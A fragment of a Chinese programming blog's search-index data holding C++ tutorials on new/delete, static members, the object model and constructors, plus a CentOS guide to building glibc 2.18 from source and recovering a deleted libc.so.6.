介绍在软件开发过程中，常常需要动态地分配和撤销内存空间，例如对动态链表中结点的插入与删除。在 C 语言中是利用库函数 malloc() 和 free() 来分配和撤销内存空间的。C++ 提供了较简便而功能较强的运算符 new 和 delete 来取代 malloc() 和 free() 函数。值得注意的是，new 和 delete 是运算符，不是函数，因此执行效率更高。虽然为了与 C 语言兼容，C++ 仍保留 malloc() 和 free() 函数，但建议用户不要使用 malloc() 和 free() 函数，而是使用 new 和 delete 运算符。 new 和 delete 的基础语法 new 运算符的简单使用例子如下： new int;：开辟一个存放整数的内存空间，返回一个指向该内存空间的地址（即指针） new int(100);：开辟一个存放整数的空间，并指定该整数的初值为 100，返回一个指向该内存空间的地址（即指针） new char[10];：开辟一个存放字符数组（包括 10 个元素）的空间，返回首元素的地址（即指针） new int[5][4];：开辟一个存放二维整型数组（大小为 5*4）的空间，返回首元素的地址（即指针） float *p = new float (3.14159);：开辟一个存放单精度数的空间，并指定该实数的初值为 3.14159，将返回的该空间的地址赋给指针变量 值得注意的是，用 new 分配数组内存空间时不能指定初值，如果由于内存不足等原因而导致无法正常分配内存空间，那么 new 会返回一个空指针 NULL，用户可以根据该指针的值判断内存空间是否分配成功。 new 和 delete 的使用案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;iostream&gt;using namespace std;class Teacher {private: int _age;public: Teacher(int age) { this-&gt;_age = age; cout &lt;&lt; "构造函数被调用" &lt;&lt; endl; } ~Teacher() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; } void setAget(int age) { this-&gt;_age = age; } int getAge() { return this-&gt;_age; }};// C语言分配基础类型void functionA() { int *p = (int *) malloc(sizeof(int)); *p = 3; cout &lt;&lt; "functionA -&gt; p = " &lt;&lt; *p &lt;&lt; endl; free(p);}// C++分配基础类型void functionB() { int *a = new int; *a = 3; cout &lt;&lt; "functionB -&gt; a = " &lt;&lt; *a &lt;&lt; endl; delete a; int *b = new int(30); cout &lt;&lt; "functionB -&gt; b = " &lt;&lt; *b &lt;&lt; endl; delete b;}// C语言分配数组类型void functionC() { char *p = (char *) malloc(sizeof(char) * 3); p[0] = \'a\'; p[1] = \'b\'; p[2] = \'c\'; cout &lt;&lt; "functionC -&gt; p = " &lt;&lt; p[0] &lt;&lt; p[1] &lt;&lt; p[2] &lt;&lt; endl; free(p);}// C++分配数组类型void functionD() { char *p = new char[3]; p[0] = \'e\'; p[1] = \'f\'; p[2] = \'g\'; cout &lt;&lt; "functionD -&gt; p = " &lt;&lt; p[0] &lt;&lt; p[1] &lt;&lt; p[2] &lt;&lt; endl; delete []p;}// C语言分配对象void functionE() { // 这里不会自动调用类的构造函数和析构函数 Teacher *p = (Teacher *) malloc(sizeof(Teacher)); p-&gt;setAget(33); cout &lt;&lt; "functionE -&gt; age = " &lt;&lt; p-&gt;getAge() &lt;&lt; endl; free(p);}// C++分配对象void functionF() { // new和delete会分别自动调用类的构造函数和析构函数 Teacher *p = new Teacher(35); cout &lt;&lt; "functionF -&gt; age = " &lt;&lt; p-&gt;getAge() &lt;&lt; endl; delete p;}int main() { functionA(); functionB(); functionC(); functionD(); functionE(); functionF(); return 0;} 程序运行输出的结果如下： 123456789functionA -&gt; p = 3functionB -&gt; a = 3functionB -&gt; b = 30functionC -&gt; p = abcfunctionD -&gt; p = efgfunctionE -&gt; age = 33构造函数被调用functionF -&gt; age = 35析构函数被调用 上面的 Teacher *p = new Teacher(35); 这种写法，是将两个语句（定义指针变量和使用 new 建立新对象）合并为一个语句，并指定初值，在调用对象时，既可以通过对象名，也可以通过指针。在执行 new 运算符时，如果内存空间不足，无法开辟所需的内存空间，目前大多数 C++ 编译器都会返回一个 0 指针值。只要检测返回值是否为 0，就可判断内存空间是否分配成功。ANSI C++ 标准提出，在执行 new 出现故障时，就抛出一个异常，用户可根据异常进行相关处理，但 C++ 标准仍然允许在出现 new 故障时返回 0 指针值。值得注意的是，不同的编译器对 new 故障的处理方法是不同的。当不再需要使用由 new 建立的对象时，可以用 delete 运算符予以释放，此后程序不能再使用该对象。如果用一个指针变量先后指向了不同的动态对象，应注意指针变量的当前指向，以避免释放错了对象。在执行 delete 运算符时，在释放内存空间之前，会自动调用类的析构函数，完成有关善后清理工作。 静态成员变量静态成员变量的概念 静态成员局部于类，它不是对象成员 在类外访问静态成员变量时，可以使用 类名 :: 作为限定词，或通过对象访问 关键字 static 可以用于声明一个类的成员，静态成员提供了一个同类对象的共享机制 将一个类的成员声明为 static 时，这个类无论有多少个对象被创建，这些对象都共享这个 static 成员 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;using namespace std;class Counter {private: // 声明静态成员变量 static int num;public : // 成员函数访问静态成员变量 void setNum(int i) { num = i; } void showNum() { cout &lt;&lt; num &lt;&lt; endl; }};// 定义静态成员变量，这里不是简单的变量赋值，更重要的是告诉C++编译器，给静态成员变量分配内存int Counter::num = 0;int main() { Counter a, b; a.showNum(); b.showNum(); a.setNum(10); a.showNum(); b.showNum(); return 0;} 程序运行输出的结果如下： 1234001010 静态成员变量的使用123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;class Counter {public: int mem; // 公有成员变量 static int smem; // 公有静态成员变量public : Counter(int num) { mem = num; }};// 定义静态成员变量，这里不是简单的变量赋值，更重要的是告诉C++编译器，给静态成员变量分配内存int Counter::smem = 0;int main() { Counter c(5); for (int i = 0; i &lt; 5; i++) { // 访问静态成员变量的方法1（通过类名直接访问） Counter::smem += i; cout &lt;&lt; "Counter::smem = "&lt;&lt; Counter::smem &lt;&lt; endl; } // 访问静态成员变量的方法2（通过对象访问） cout &lt;&lt; "c.smem = " &lt;&lt; c.smem &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123456Counter::smem = 0Counter::smem = 1Counter::smem = 3Counter::smem = 6Counter::smem = 10c.smem = 10 静态成员函数静态成员函数的概念 静态成员函数、静态成员变量都属于类的 静态成员函数都是以关键字 static 声明 在类外调用静态成员函数时，可以使用 类名 :: 作为限定词，或通过对象访问 静态成员函数提供不依赖于类数据结构的共同操作，它没有 this 指针，而普通成员函数包含一个指向具体对象的 this 指针 静态成员函数的使用值得一提的是，在静态成员函数中，不能访问普通成员变量和调用普通成员函数。这是因为静态成员函数属于整个类的，它没办法区分普通成员变量和普通成员函数是属于哪个具体的对象；同时在静态成员函数内，不能使用 this 指针。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Counter {private: int num;public: // 声明静态成员函数 static int getNum(Counter *p); static void setNum(int i, Counter *p);};// 定义静态成员函数int Counter::getNum(Counter *p) { return p-&gt;num;}void Counter::setNum(int i, Counter *p) { p-&gt;num = i;}int main() { Counter obj; // 访问静态成员函数的方法1（通过类名直接访问） Counter::setNum(1, &amp;obj); cout &lt;&lt; "num = " &lt;&lt; Counter::getNum(&amp;obj) &lt;&lt; endl; // 访问静态成员函数的方法2（通过对象访问） obj.setNum(3, &amp;obj); cout &lt;&lt; "num = " &lt;&lt; obj.getNum(&amp;obj) &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12num = 1num = 3 C++ 面向对象模型初探对象模型概述C++ 对象模型可以概括为以下两部分： 对于各种特性支持的底层实现机制 语言中直接支持面向对象程序设计的部分，主要涉及如构造函数、析构函数、虚函数、继承（单继承、多继承、虚继承）、多态等 在 C 语言中，“数据” 和 “处理数据的操作（函数）” 是分开来声明的，也就是说，语言本身并没有支持 “数据和函数” 之间的关联性。在 C++ 中，通过抽象数据类型 ADT（Abstract Data Type），在类中定义数据和函数来实现数据和函数直接的绑定。概括来说，在 C++ 类中有两种成员数据：static、nonstatic，三种成员函数：static、nonstatic、virtual。 属性和函数的处理机制C++ 中的 Class 从面向对象理论出发，将变量（属性）和函数（方法）集中定义在一起，用于描述现实世界中的类。从计算机的角度，程序依然由数据段和代码段构成。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;struct S1 { int i; int j; int k;};struct S2 { int i; int j; int k; static int m;};class C1 {public: int i; int j; int k;};class C2 {public: int i; int j; int k; static int m;public: int getK() const { return k; } void setK(int val) { k = val; }};int main() { printf("s1:%d \\n", sizeof(S1)); printf("s2:%d \\n", sizeof(S2)); printf("c1:%d \\n", sizeof(C1)); printf("c2:%d \\n", sizeof(C2)); return 0;} 程序运行输出的结果如下： 1234s1:12s2:12c1:12c2:12 通过上面的案例，可以得知 C++ 类对象中的成员变量和成员函数是分开存储的，C 语言中的内存四区模型仍然有效。C++ 中类的普通成员函数都隐式包含一个指向当前对象的 this 指针。 静态成员变量：存储于全局数据区中 普通成员变量：存储于对象中，与 struct 变量有相同的内存布局和字节对齐方式 成员函数：存储于代码段中 this 指针的使用 值得一提的是，当使用 const 修饰类成员函数时，成员函数不能修改被调用对象的值，这是因为此时 const 本质上修饰的是 this 指针，间接也说明了 const 与 static 关键字不能同时修饰类成员函数，示例代码如下： 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;class Test {private: int _cm;public: Test() {} Test(int _m) : _cm(_m) {} int get_cm() const { // _cm = 10; 是错误写法，对象的_cm属性值不能被改变 return _cm; }};void Cmf(const Test &amp; _tt) { cout &lt;&lt; _tt.get_cm();}int main() { Test t(8); Cmf(t); // 打印结果为8 return 0;} 全局函数与成员函数的使用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;using namespace std;class Test{public: int a; int b;public: Test(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } ~Test() { }public: void printT() { cout &lt;&lt; "a:" &lt;&lt; a &lt;&lt; " b: " &lt;&lt; b &lt;&lt; endl; } Test testAdd(Test&amp; t2) { Test tmp(this-&gt;a + t2.a, this-&gt;b + t2.b); return tmp; } //t1.testAdd2(t2); //返回一个引用，相当于返回自身 //返回t1这个元素，this就是&amp;t1 Test&amp; testAdd2(Test&amp; t2) { this-&gt;a = this-&gt;a + t2.a; this-&gt;b = this-&gt;b + t2.b; return *this; //把 *(&amp;t1) 又回到了 t1元素 }};// 全局函数Test testAdd(Test&amp; t1, Test&amp; t2){ Test tmp; tmp.a = t1.a + t2.a; tmp.b = t1.b + t2.b; return tmp;}// 全局函数void printT(Test* pT){ cout &lt;&lt; "a:" &lt;&lt; pT-&gt;a &lt;&lt; " b: " &lt;&lt; pT-&gt;b &lt;&lt; endl;}int main(){ Test t1(1, 2); Test t2(3, 4); // 调用全局函数 Test t3; t3 = testAdd(t1, t2); printT(&amp;t3); // 调用成员函数 Test t4 = t1.testAdd(t2); // 将匿名对象直接转化成t4 t4.printT(); Test t5; t5 = t1.testAdd(t2); // 将匿名对象复制给t5 t5.printT(); t1.testAdd2(t2); // 函数内部使用了this指针 t1.printT(); return 0;} 程序运行输出的结果如下： 1234a:4 b: 6a:4 b: 6a:4 b: 6a:4 b: 6 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"Linux 解决 libc.so.6 version GLIBC_2.18 not found 的问题",url:"/posts/15a7083d.html",text:'错误日志信息 1/lib64/libc.so.6: version \'GLIBC_2.18\' not found 系统环境 12CentOS Linux release 7.9.2009 (Core)Linux 3.10.0-1160.45.1.el7.x86_64 #1 SMP Wed Oct 13 17:20:51 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 查看当前 GLIBC 的版本 123456789101112131415161718192021# strings /lib64/libc.so.6 | grep GLIBCGLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_2.13GLIBC_2.14GLIBC_2.15GLIBC_2.16GLIBC_2.17 问题分析 通过查看当前 GLIBC 的版本，可以发现目前系统中最高只支持 GLIBC_2.17，当需要安装依赖 GLIBC_2.18 的软件时，就会出现 libc.so.6: version \'GLIBC_2.18\' not found 的错误信息。glibc 是 GNU 发布的 libc 库，即 C 运行库。glibc 是 Linux 系统中最底层的 API，几乎其它任何运行库都会依赖于 glibc。值得一提的是，glibc 除了封装了 Linux 操作系统所提供的系统服务外，它本身也提供了许多其它一些必要功能服务的实现。对于 CentOS 这样的系统，为了追求稳定性（这个值得商榷）往往各种库版本都很低，比如 CentOS 6.5 甚至 CentOS 7.0 自带的还是 glibc 2.12, 而 Ubuntu 14.04 自带 glibc2.19。如果升级 glibc 到一个太新的版本，可能会影响 CentOS 的稳定运行，所以不建议随便升级 glibc 的版本。 解决思路 a) 手动编译安装高版本的 gcc b) 在低版本的系统编译自己的软件，前提是自己的软件确实不需要使用新版 GCC 才支持的特性 c) 利用容器技术（如 Docker），在低版本的操作系统内，轻量级的隔离出一个虚拟运行环境，适应自己的软件 编译安装 GCC glibc 的各个版本可以在这里下载。特别注意，在条件允许的情况下，强烈建议在执行下述的 make install 命令之前，全量备份整个 Linux 系统，防止因系统文件意外被破坏，导致系统在启动或运行期间出现崩溃的问题。 1234567891011121314151617181920212223# 下载glibc-2.18# curl -O http://ftp.gnu.org/gnu/glibc/glibc-2.18.tar.gz# 解压文件# tar zxf glibc-2.18.tar.gz# 进入解压目录# cd glibc-2.18# 建立输出目录，用于存放编译时所有产生的中间文件# mkdir build# 进入输出目录# cd build# 执行配置# ../configure --prefix=/usr --disable-profile --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin --enable-checking=release --enable-languages=c,c++# 编译GCC，指定编译使用的线程数为8，编译耗时较长# make -j8# 安装GCC（切记谨慎执行）# make install 验证 GCC 的版本是否升级成功 如果在下面的输出结果中，出现 GLIBC_2.18，则代表 GCC 的版本升级成功。 12345678910111213141516171819202122# strings /lib64/libc.so.6 | grep GLIBCGLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_2.13GLIBC_2.14GLIBC_2.15GLIBC_2.16GLIBC_2.17GLIBC_2.18 或者查看 ldd 的版本 12345# ldd --versionldd (GNU libc) 2.18Copyright (C) 2013 Free Software Foundation, Inc.This is free software; see the source for copying conditions. There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 或者查看系统的库文件 123456789# 查看系统的libc.so库文件# ls /usr/lib64/libc-*.so -al-rwxr-xr-x. 1 root root 2156592 10月 14 02:29 /usr/lib64/libc-2.17.so-rwxr-xr-x. 1 root root 10232696 10月 24 14:52 /usr/lib64/libc-2.18.so# 查看系统的libc.so库文件# ls /usr/lib64/libc.so* -al-rw-r--r--. 1 root root 253 10月 24 14:51 /usr/lib64/libc.solrwxrwxrwx. 1 root root 12 10月 24 14:52 /usr/lib64/libc.so.6 -&gt; libc-2.18.so 解决误删 libc.so.6 库文件的问题 在上述的操作中，若误删了 libc.so.6 库文件，会导致系统大多数命令不可用（例如：ls、cp、ln）。此时千万不要随便重启系统，缺少 libc.so.6 库文件很容易导致系统无法正常启动，其次也尽量不要关闭正在运行的终端，因为很多东西还可以补救，建议参考以下步骤重新创建 libc.so.6 库文件。 123456789101112# 查看系统可用的libc库文件# ls /usr/lib64/libc-*.so -al-rwxr-xr-x. 1 root root 2156592 10月 14 02:29 /usr/lib64/libc-2.17.so# 通过系统环境变量LD_PRELOAD导入可用的libc库文件# export LD_PRELOAD=/usr/lib64/libc-2.17.so# 利用可用的libc库文件，创建新的libc.so.6库文件# ln -s -f /usr/lib64/libc-2.17.so /usr/lib64/libc.so.6# 取消设置系统环境变量LD_PRELOAD# unset LD_PRELOAD 参考博客 Linux（CentOS）GLIBC 出错的补救方式 解决 libc.so.6: version ‘GLIBC_2.18’ not found 的问题 Linux/Centos 下 /lib64/libc.so.6: version ‘GLIBC_2.14’ not found var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"C++ 入门基础之四",url:"/posts/beb2ebb3.html",text:'大纲 C++ 入门基础之一、C++ 入门基础之二、C++ 入门基础之三 C++ 入门基础之四、C++ 入门基础之五、C++ 入门基础之六 C++ 入门基础之七、C++ 入门基础之八、C++ 入门基础之九 学习目标 C++ 面向对象的基础模型 C++ 编译器管理类和对象的机制 C++ 编译器对类对象的生命周期管理，包括对象的创建、使用、销毁等 类和对象基本概念 a) 类、对象、成员变量、成员函数 b) 面向对象三大概念：封装、继承、多态 类的封装封装（Encapsulation）： a) 封装，是面向对象程序设计最基本的特性。把数据（属性）和函数（操作）合成一个整体，对数据和函数进行访问控制，这在计算机世界中是用类与对象实现的。 b) 封装，把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。 C++ 中类的封装： 成员变量：C++ 中用于表示类属性的变量 成员函数：C++ 中用于表示类行为的函数 类成员的访问控制在 C++ 中可以给成员变量和成员函数定义访问级别： private：修饰的成员变量和成员函数，只能在类的内部被访问 public：修饰的成员变量和成员函数，可以在类的内部和类的外部被访问 protected：修饰的成员变量和成员函数，可以在派生类（继承的子类）的内部访问，不能在派生类的外部被访问 特别注意：若在类中没有声明访问控制级别的成员变量和成员函数，默认都是 private 访问级别的 基于类成员的访问控制，计算圆形面积的示例代码如下： 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Circle {private: double m_r; // 圆形的半径 double m_s; // 圆形的面积public: void setR(double r) { m_r = r; } double getR() { return m_r; } double getS() { m_s = 3.14 * m_r * m_r; return m_s; }};int main() { double r; cout &lt;&lt; "请输入圆形的半径："; cin &gt;&gt; r; Circle circle; circle.setR(r); cout &lt;&lt; "圆形的面积是：" &lt;&lt; circle.getS() &lt;&lt; endl; return 0;} struct 和 class 的区别struct 和 class 关键字的区别如下： 在用 class 定义类时，所有成员的默认属性为 private 在用 struct 定义类时，所有成员的默认属性为 public 类的声明与类的实现一起写123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Circle {private: double m_r; // 圆形的半径 double m_s; // 圆形的面积public: void setR(double r) { m_r = r; } double getR() { return m_r; } double getS() { m_s = 3.14 * m_r * m_r; return m_s; }};int main() { double r; cout &lt;&lt; "请输入圆形的半径："; cin &gt;&gt; r; Circle circle; circle.setR(r); cout &lt;&lt; "圆形的面积是：" &lt;&lt; circle.getS() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12请输入圆形的半径：30圆形的面积是：2826 类的声明与类的实现分开写在企业开发中，由于项目结构比较庞大，一般都会将类的声明和类的实现分开写在不同的源文件中。 Teacher.h 头文件，声明了 Teacher 类的成员变量和成员函数；使用 #ifndef、#define、#endif 指令，是为了防止 Teacher.h 头文件被多次引用时 C++ 编译器编译失败，也可以直接使用 #pragma once 指令来替代。 1234567891011121314151617181920#ifndef TEACHER_H#define TEACHER_Hclass Teacher {private: char *_name; int _age;public: const char *getName() const; void setName(char *name); int getAge() const; void setAge(int age);};#endif Teacher.cpp 源文件，实现了在 Teacher.h 头文件中定义的成员函数 1234567891011121314151617181920#include &lt;iostream&gt;#include "Teacher.h"using namespace std;const char *Teacher::getName() const { return this-&gt;_name;}void Teacher::setName(char *name) { this-&gt;_name = name;}int Teacher::getAge() const { return this-&gt;_age;}void Teacher::setAge(int age) { this-&gt;_age = age;} Main.cpp 源文件 12345678910111213#include &lt;iostream&gt;#include "Teacher.h"using namespace std;int main() { char name[32] = "Peter"; Teacher teacher; teacher.setAge(10); teacher.setName(name); cout &lt;&lt; "age: " &lt;&lt; teacher.getAge() &lt;&lt; endl; cout &lt;&lt; "name: " &lt;&lt; teacher.getName() &lt;&lt; endl;} 程序运行的输出结果如下： 12age: 10name: Peter 对象的构造和析构析构函数析构函数的定义析构函数的定义： C++ 中的类可以定义一个特殊的成员函数来清理对象，这个特殊的成员函数叫做析构函数 析构函数的名称与类的名称是完全相同的，只是在前面加了个波浪号 ~ 作为前缀，它没有任何参数，也没有任何返回类型的声明 析构函数有助于在跳出程序（比如关闭文件、释放内存等）前释放资源 析构函数在对象销毁时会自动被调用 析构函数的调用： C++ 编译器会自动调用析构函数 析构函数的声明12345678910111213141516171819#include &lt;iostream&gt;using namespace std;class Teacher {public: // 析构函数 ~Teacher() { cout &lt;&lt; "调用析构函数" &lt;&lt; endl; }};int main() { Teacher teacher; return 0;} 程序运行输出的结果如下： 1调用析构函数 构造函数创建一个对象时，常常需要做某些初始化的工作，例如对数据成员赋初值。必须注意，类的数据成员是不能在声明类时初始化的。为了解决这个问题，C++ 编译器提供了构造函数（Constructor）来处理对象的初始化。构造函数是一种特殊的成员函数，与其他成员函数不同，不需要用户来调用它，而是在建立对象时自动被调用。 构造函数的定义构造函数的定义： C++ 中的类可以定义与类名相同的特殊成员函数，这种与类名相同的成员函数叫做构造函数 构造函数在定义时可以有参数 构造函数没有任何返回类型的声明 构造函数可用于为某些成员变量设置初始值 构造函数的调用： 自动调用：一般情况下 C++ 编译器会自动调用构造函数 手动调用：在一些特定的情况下，需要手工调用构造函数 构造函数的分类构造函数一般分为三类：无参数的构造函数、带参数的构造函数、拷贝构造函数（赋值构造函数）。 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;class Test {private: int _a; int _b;public: // 无参数的构造函数 Test() { _a = 1; _b = 2; } // 带参数的构造函数 Test(int a, int b) { _a = a; _b = b; } // 拷贝构造函数（赋值构造函数） Test(const Test &amp;obj) { _a = obj._a; _b = obj._b; }}; 默认的构造函数C++ 中有两个特殊的构造函数： 默认无参构造函数：当类中没有定义构造函数时，编译器默认会提供一个无参构造函数，并且其函数体为空 默认拷贝构造函数：当类中没有定义拷贝构造函数时，编译器默认会提供一个拷贝构造函数，用于简单地进行类成员变量的值复制 构造函数的调用方式构造函数的调用方式分为以下三种： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;using namespace std;class Test {private: int _a; int _b;public: Test() { _a = 1; _b = 1; } Test(int a) { _a = a; _b = 3; } Test(int a, int b) { _a = a; _b = b; }public: int getA() const { return _a; } int getB() const { return _b; }};int main() { // 第一种：C++编译器调用有参构造函数(等号法) Test t1 = (1, 2, 3, 4, 5); printf("a = %d, b = %d\\n", t1.getA(), t1.getB()); // 第二种：C++编译器调用有参构造函数(括号法) Test t2(10, 20); printf("a = %d, b = %d\\n", t2.getA(), t2.getB()); // C++编译器调用无参构造函数 Test t0; printf("a = %d, b = %d\\n", t0.getA(), t0.getB()); // 第三种：手动调用构造函数生成一个对象(直接调用构造函数法) Test t3 = Test(100, 200); printf("a = %d, b = %d\\n", t3.getA(), t3.getB()); return 0;} 程序运行输出的结果如下： 1234a = 5, b = 3a = 10, b = 20a = 1, b = 1a = 100, b = 200 拷贝构造函数的调用场景第一种调用场景123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;using namespace std;class Test {private : int _a;public: Test() { cout &lt;&lt; "无参构造函数自动被调用了" &lt;&lt; endl; } Test(int a) { _a = a; cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; } Test(const Test &amp;obj) { _a = obj._a + 10; cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; } ~Test() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; } int getA() { return _a; }};void functionA() { Test t1(1); Test t0(2); t0 = t1; // 普通的赋值操作，拷贝构造函数不会被调用 Test t2 = t1; // 类的初始化操作(等号法)，拷贝构造函数会被调用 cout &lt;&lt; "a = " &lt;&lt; t2.getA() &lt;&lt; endl;}int main() { functionA(); return 0;} 程序运行输出的结果如下： 1234567有参构造函数被调用了有参构造函数被调用了拷贝构造函数被调用了a = 11析构函数被调用了析构函数被调用了析构函数被调用了 第二种调用场景12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;using namespace std;class Test {private : int _a;public: Test() { cout &lt;&lt; "无参构造函数自动被调用了" &lt;&lt; endl; } Test(int a) { _a = a; cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; } Test(const Test &amp;obj) { _a = obj._a + 10; cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; } ~Test() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; } int getA() { return _a; }};void functionA() { Test t1(3); Test t2(t1); // 类的初始化操作(括号法)，拷贝构造函数会被调用 cout &lt;&lt; "a = " &lt;&lt; t2.getA() &lt;&lt; endl;}int main() { functionA(); return 0;} 程序运行输出的结果如下： 12345有参构造函数被调用了拷贝构造函数被调用了a = 13析构函数被调用了析构函数被调用了 第三种调用场景12345678910111213141516171819202122232425262728293031323334353637383940414243#include "iostream"using namespace std;class Location {private : int X, Y;public: Location(int xx = 0, int yy = 0) { X = xx; Y = yy; cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; } Location(const Location &amp;p) { X = p.X; Y = p.Y; cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; } ~Location() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; } int getX() { return X; } int getY() { return Y; }};void functionA(Location b) { cout &lt;&lt; b.getX() &lt;&lt; "," &lt;&lt; b.getY() &lt;&lt; endl;}int main() { Location a(1, 2); functionA(a); // 拷贝构造函数会被调用，这里会使用实参变量（a）初始化形参变量（b），同时会多创建一个Location对象（匿名对象），所以最后析构函数会被调用两次 return 0;} 程序运行输出的结果如下： 12345有参构造函数被调用了拷贝构造函数被调用了1,2析构函数被调用了析构函数被调用了 第四种调用场景1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;using namespace std;class Location {private : int x, y;public: Location(int xx = 0, int yy = 0) { x = xx; y = yy; cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; } Location(const Location &amp;p) { x = p.x; y = p.y; cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; } ~Location() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; } int getX() { return x; } int getY() { return y; }};Location functionA() { Location l(1, 2); return l;}int main() { // 匿名对象的去与留，关键是看返回匿名对象时如何接收，一般有以下两种情况： // 若将函数functionA()返回的匿名对象，赋值给另外一个同类型的对象，那么匿名对象会被析构 // 此时有参构造函数和析构函数被调用两次 Location A; A = functionA(); // 若使用函数functionA()的匿名对象，来初始化另外一个同类型的对象，那么匿名对象会直接转成B对象 // 此时有参构造函数与析构函数各被调用一次 // Location B = functionA(); return 0;} 程序运行输出的结果如下： 1234有参构造函数被调用了有参构造函数被调用了析构函数被调用了析构函数被调用了 思考：在上述的代码中，在 main() 函数内直接调用 functionA() 函数时，为什么拷贝构造函数没有被调用呢？是否跟 C++ 编译器的版本有关系呢？ 构造函数的使用规则 当类中没有定义任何一个构造函数时，C++ 编译器会提供默认无参构造函数和默认拷贝构造函数 当类中定义了拷贝构造函数时，C++ 编译器不会提供默认无参构造函数 当类中定义了任意的非拷贝构造函数（即当类中定义了有参构造函数或无参构造函数），C++ 编译器不会提供默认无参构造函数 C++ 提供的默认拷贝构造函数，只负责给类成员变量简单赋值 必要的时候，需要手动编写拷贝构造函数 构造函数和普通成员函数都遵循函数重载规则 构造函数初始化列表初始化列表出现的原因有的时候必须用带有初始化列表的构造函数：（1）没有默认无参构造函数的成员类对象；（2）const 成员或引用类型的成员，必须要通过初始化列表进行初始化，因为这两种对象要在声明后马上初始化，而在构造函数中，做的就是对它们赋值，这样是不被允许的。值得一提的是，构造函数中有着比我们所看见的还要多的细节，构造函数可以调用其它的构造函数来初始化对象中的基类对象和成员对象的构造函数。类的数据成员中的其它类对象，若该成员对象是没有默认无参构造函数，则必须进行显式初始化；因为编译器会隐式调用成员对象的默认无参构造函数，而它又没有默认无参构造函数，则编译器会编译失败。 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;class Teacher {private : int _age;public: Teacher(int age) { _age = age; } int getAge() const { return _age; }};class Student {private : int _age; Teacher teacher;public: int getAge() const { return _age; }};int main() { Teacher t(20); Student s; // C++编译器编译不通过 return 0;} 上述示例代码无法通过编译，Student 的类数据成员中有一个 Teacher 类的对象 teacher，创建 Student 类时，要先创建其成员对象 teacher；由于 Teacher 类有一个自定义的有参构造函数，C++ 编译器不会再提供默认无参构造函数，因此 teacher 对象无法被自动创建。使用构造函数初始化列表改写后，正确的示例代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;using namespace std;class Teacher {private : int 